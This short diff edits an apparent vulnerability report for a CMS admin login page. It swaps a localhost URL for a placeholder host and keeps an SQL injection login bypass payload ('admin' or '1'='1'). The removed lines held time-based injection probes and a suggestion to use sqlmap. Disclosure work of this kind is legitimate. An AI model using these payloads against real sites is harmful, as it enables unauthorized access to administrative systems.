@@ -16,10 +16,5 @@ affected reason:
 --------------------------------
 affected executable: 
   
-  visit url:http://127.0.0.1/cms/5/admin/login.php
+  visit url:http://xx.xx.com/cms/5/admin/login.php
   use: admin' or '1'='1 as the username;  Then we can log in to the background with any password.
-  
-  Like this: http://xx.xx.com/admin/manager/admin_mod.php?id=1'
-             http://xx.xx.com/admin/manager/admin_mod.php?id=1 RLIKE SLEEP(2)
-             
-Then, we can use tools like sqlmap for more information.
